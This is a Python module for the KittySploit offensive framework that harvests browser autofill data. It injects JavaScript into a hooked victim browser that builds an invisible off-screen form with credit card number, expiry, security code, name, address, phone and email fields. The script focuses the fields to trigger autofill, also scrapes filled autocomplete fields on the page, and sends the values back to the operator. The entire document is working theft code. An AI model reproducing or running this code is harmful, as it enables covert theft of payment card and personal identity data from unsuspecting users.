from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Autofill Payment / Identity Harvest",
		"description": "Trigger browser autofill for payment and identity fields and collect filled values",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	wait_time = OptInteger(4, "Seconds to wait for autofill after focusing fields", False)
	include_payment = OptBool(True, "Include credit-card autofill fields", False)
	include_identity = OptBool(True, "Include name/address/phone/email autofill fields", False)

	def run(self):
		wait_s = max(1, int(self.wait_time or 4))
		include_payment = self._to_bool(self.include_payment)
		include_identity = self._to_bool(self.include_identity)

		code_js = f"""
		(function() {{
			const WAIT_MS = {wait_s * 1000};
			const INCLUDE_PAYMENT = {str(include_payment).lower()};
			const INCLUDE_IDENTITY = {str(include_identity).lower()};

			const fields = [];
			if (INCLUDE_IDENTITY) {{
				fields.push(
					{{ name: 'name', autocomplete: 'name', type: 'text' }},
					{{ name: 'given-name', autocomplete: 'given-name', type: 'text' }},
					{{ name: 'family-name', autocomplete: 'family-name', type: 'text' }},
					{{ name: 'email', autocomplete: 'email', type: 'email' }},
					{{ name: 'tel', autocomplete: 'tel', type: 'tel' }},
					{{ name: 'organization', autocomplete: 'organization', type: 'text' }},
					{{ name: 'street-address', autocomplete: 'street-address', type: 'text' }},
					{{ name: 'address-level2', autocomplete: 'address-level2', type: 'text' }},
					{{ name: 'address-level1', autocomplete: 'address-level1', type: 'text' }},
					{{ name: 'postal-code', autocomplete: 'postal-code', type: 'text' }},
					{{ name: 'country', autocomplete: 'country', type: 'text' }},
					{{ name: 'country-name', autocomplete: 'country-name', type: 'text' }}
				);
			}}
			if (INCLUDE_PAYMENT) {{
				fields.push(
					{{ name: 'cc-name', autocomplete: 'cc-name', type: 'text' }},
					{{ name: 'cc-number', autocomplete: 'cc-number', type: 'text' }},
					{{ name: 'cc-exp', autocomplete: 'cc-exp', type: 'text' }},
					{{ name: 'cc-exp-month', autocomplete: 'cc-exp-month', type: 'text' }},
					{{ name: 'cc-exp-year', autocomplete: 'cc-exp-year', type: 'text' }},
					{{ name: 'cc-csc', autocomplete: 'cc-csc', type: 'text' }},
					{{ name: 'cc-type', autocomplete: 'cc-type', type: 'text' }}
				);
			}}

			const existing = document.getElementById('ks-autofill-harvest');
			if (existing) existing.remove();

			const form = document.createElement('form');
			form.id = 'ks-autofill-harvest';
			form.method = 'post';
			form.action = '#';
			form.setAttribute('autocomplete', 'on');
			form.style.cssText = 'position:fixed;left:-10000px;top:0;opacity:0;pointer-events:none;height:1px;width:1px;overflow:hidden;';

			const inputs = {{}};
			fields.forEach(function(f) {{
				const input = document.createElement('input');
				input.type = f.type;
				input.name = f.name;
				input.id = 'ks_af_' + f.name;
				input.autocomplete = f.autocomplete;
				input.setAttribute('autocomplete', f.autocomplete);
				form.appendChild(input);
				inputs[f.name] = input;
			}});

			// Also sample autocomplete-tagged fields already on the page
			const pageHits = [];
			try {{
				document.querySelectorAll('input, select, textarea').forEach(function(el) {{
					const ac = (el.getAttribute('autocomplete') || '').toLowerCase();
					if (!ac || ac === 'off' || ac === 'on') return;
					const interesting = /^(name|given-name|family-name|email|tel|organization|street-address|address-|postal-code|country|cc-)/.test(ac);
					if (!interesting) return;
					pageHits.push({{
						source: 'page',
						autocomplete: ac,
						name: el.name || el.id || '',
						type: (el.getAttribute('type') || el.tagName || '').toLowerCase(),
						value: String(el.value || '')
					}});
				}});
			}} catch (e) {{}}

			document.body.appendChild(form);

			return new Promise(function(resolve) {{
				// Focus cycle helps some browsers trigger autofill UI / fill
				const keys = Object.keys(inputs);
				let i = 0;
				function focusNext() {{
					if (i < keys.length) {{
						try {{ inputs[keys[i]].focus(); }} catch (e) {{}}
						i++;
						setTimeout(focusNext, 40);
					}}
				}}
				focusNext();

				setTimeout(function() {{
					const harvested = [];
					keys.forEach(function(k) {{
						const v = String(inputs[k].value || '');
						if (v) {{
							harvested.push({{
								source: 'injected',
								autocomplete: inputs[k].autocomplete,
								name: k,
								value: v
							}});
						}}
					}});

					try {{ form.remove(); }} catch (e) {{}}

					const filledPage = pageHits.filter(function(h) {{ return !!h.value; }});
					resolve(JSON.stringify({{
						ok: true,
						origin: location.origin,
						page_url: location.href,
						wait_ms: WAIT_MS,
						injected_filled: harvested,
						page_filled: filledPage,
						page_candidates: pageHits.length,
						count: harvested.length + filledPage.length
					}}));
				}}, WAIT_MS);
			}});
		}})();
		"""

		print_status(f"Triggering payment/identity autofill (wait {wait_s}s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(wait_s + 12))
		if not result:
			print_error("Failed to run autofill harvest")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Autofill Payment / Identity")
		print_info(f"  Page: {data.get('page_url')}")
		print_info(f"  Page autocomplete candidates: {data.get('page_candidates', 0)}")

		injected = data.get("injected_filled") or []
		page_filled = data.get("page_filled") or []
		if not injected and not page_filled:
			print_status("No autofilled values observed (browser may require user gesture / saved profiles)")
			return True

		if injected:
			print_warning(f"Injected form filled ({len(injected)}):")
			for item in injected:
				print_success(f"  [{item.get('autocomplete')}] {item.get('value')}")

		if page_filled:
			print_warning(f"Existing page fields filled ({len(page_filled)}):")
			for item in page_filled:
				print_success(
					f"  [{item.get('autocomplete')}] {item.get('name')}: {item.get('value')}"
				)

		return True
